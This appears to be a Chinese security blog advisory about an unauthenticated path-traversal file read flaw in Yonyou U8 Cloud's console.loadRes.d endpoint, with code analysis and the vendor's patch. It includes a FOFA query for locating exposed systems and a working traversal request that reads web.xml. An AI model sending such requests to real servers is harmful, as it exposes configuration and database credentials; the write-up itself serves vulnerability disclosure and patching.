---
title: "用友U8 Cloud console.loadRes.d 任意文件读取漏洞"
source: https://mrxn.net/jswz/yonyou-u8cloud-console-loadRes-fileread.html
asset_dir: assets/用友u8-cloud-console.loadres.d-任意文件读取漏洞
---

# 用友U8 Cloud console.loadRes.d 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/25 08:35
- 1225浏览
- [0评论](#comment)
- 54分钟阅读

深入探索

CRM

身份验证

SQL

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")U8 [Cloud](#)是用友推出的云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。是基于全新的企业互联网理念设计的云ERP系统，它旨在为企业提供集人财物客产供销于一体的云ERP整体解决方案，推动企业敏经营、轻管理、简IT，助力企业实现高速发展与云化创新。用友U8 Cloud /hrss/dorado/console.loadRes.d 接口处存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

云存储

# 影响版本

1.0,2.0,2.1,2.3,2.5,2.6,2.65,2.7,3.0,3.1,3.2,3.5,3.6,3.6sp,5.0,5.0sp

# fofa语法

> `app="用友-U8-Cloud"`

# 漏洞分析

深入探索

漏洞扫描服务

编码转换工具

物流软件安全

先看漏洞通告

[![用友U8 Cloud console.loadRes.d 任意文件读取漏洞](images/img-001-cd7a19acf396.webp)](https://image.mrxn.net/cd5ee531020c4b779729b86c4c0754dc.webp)

路径都有了，直接看对应的jar包里的业务实现逻辑

漏洞预警服务

```
package com.bstek.dorado.admin;

import com.bstek.dorado.DoradoAbout;
import com.bstek.dorado.action.Action;
import com.bstek.dorado.action.impl.CachableFileDownLoadHelper;
import com.bstek.dorado.action.mapping.ActionForward;
import com.bstek.dorado.common.Setting;
import com.bstek.dorado.common.fileloader.FileLoader;
import com.bstek.dorado.common.fileloader.FileLoaderFactory;
import com.bstek.dorado.common.monitor.PerformanceLogger;
import com.bstek.dorado.data.Dataset;
import com.bstek.dorado.module.Module;
import com.bstek.dorado.module.config.ModuleConfig;
import com.bstek.dorado.utils.StringHelper;
import com.bstek.dorado.utils.http.RequestHelper;
import com.bstek.dorado.utils.xml.XmlBuilder;
import com.bstek.dorado.utils.xml.XmlDocument;
import com.bstek.dorado.utils.xml.XmlFactory;
import com.bstek.dorado.view.ViewModel;
import com.bstek.dorado.view.config.ViewModelConfig;
import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.text.DecimalFormat;
import java.util.Enumeration;
import javax.servlet.ServletRequest;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.lang.StringUtils;
import org.apache.velocity.Template;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.context.Context;

public class ConsoleController extends AdminController {
  public static final String CONTENT_TYPE_OCTET_STREAM = "application/octet-stream";

  private static final String PATH_PREFIX = "console";

  public ActionForward doLoadRes(Action action, HttpServletRequest request, HttpServletResponse response) throws Throwable {
    RequestHelper helper = new RequestHelper((ServletRequest)request);
    FileLoader loader = FileLoaderFactory.createResourceLoader();
    String res = helper.getParameter("res");
    loader.setFile("console" + res);
    CachableFileDownLoadHelper.download(loader, request, response, "application/octet-stream", res);
    return null;
  }
```

继续跟进`doDownLoad`

```
private static void doDownLoad(FileLoader loader, HttpServletRequest request, HttpServletResponse response, boolean supportsCompress, String contentType, String fileName) throws Exception {
    long lastModified = loader.getLastModified();
    long cachedLastModified = request.getDateHeader("if-modified-since");
    if (lastModified > 0L && cachedLastModified > 0L && Math.abs(lastModified - cachedLastModified) < 1000L) {
      response.setStatus(304);
    } else {
      if (contentType != null)
        response.setContentType(contentType); 
      if (fileName != null) {
        File file = new File(fileName);
        response.setHeader("content-disposition", "attachment;filename=\"" + file.getName() + "\"");
      } 
      int maxCacheAgeSecond = getMaxCacheAgeSecond();
      if (maxCacheAgeSecond > 0) {
        response.addDateHeader("Expires", (new Date()).getTime() + (maxCacheAgeSecond * 1000));
        response.addHeader("Cache-Control", "Public, max-age=" + maxCacheAgeSecond);
      } 
      response.addDateHeader("Last-Modified", lastModified);
      try {
        InputStream in = loader.getInputStream();
        try {
          if (supportsCompress) {
            ResponseUtil.output(request, response, in);
          } else {
            ResponseUtil.outputNoCompress(request, response, in);
          } 
        } finally {
          in.close();
        } 
      } catch (IOException ex) {}
      Log.debug("Resource Downloaded [" + lastModified + "][" + cachedLastModified + "]: " + loader.getFilePath());
    } 
  }
```

调用 loader 读取文件后直接响应在body，无任何过滤，造成任意文件读取[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

看下补丁，已经有判断路径是否合法

企业资源规划

```
public class ConsoleController extends AdminController
{
  public static final String CONTENT_TYPE_OCTET_STREAM = "application/octet-stream";
  private static final String PATH_PREFIX = "console";
  public ActionForward doLoadRes(Action action, HttpServletRequest request, HttpServletResponse response)
    throws Throwable
  {
    RequestHelper helper = new RequestHelper(request);

    FileLoader loader = FileLoaderFactory.createResourceLoader();
    String res = helper.getParameter("res");
        String fileAllPath = "console" + res;
        File file = new File(fileAllPath);
        //这里为了避免传../这样的路径 
    if(!file.getCanonicalPath().startsWith(new File("console").getCanonicalPath())){
            throw new IllegalArgumentException("Invalid Parameter res\"" + res + "\"!");
    }
    loader.setFile("console" + res);
    CachableFileDownLoadHelper.download(loader, request, response, "application/octet-stream", res);

    return null;
  }
```

# 漏洞复现

```
GET /hrss/dorado/console.loadRes.d?res=..\\..\\..\\..\\WEB-INF\\web.xml HTTP/1.1
Host: nc.mrxn.net
```

> 需要读的文件自行fuzz，不同安装位置不同，这里只是示例
>
> 网络安全

# 参考

- `https://security.yonyou.com/#/noticeInfo?id=563`
- `https://security.yonyou.com/#/patchInfo?identifier=a52c80ca6fac4dc48d38729890c4ae02`
- `https://mp.weixin.qq.com/s/AY5p-cF3Hn9De719Q_CeMw`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
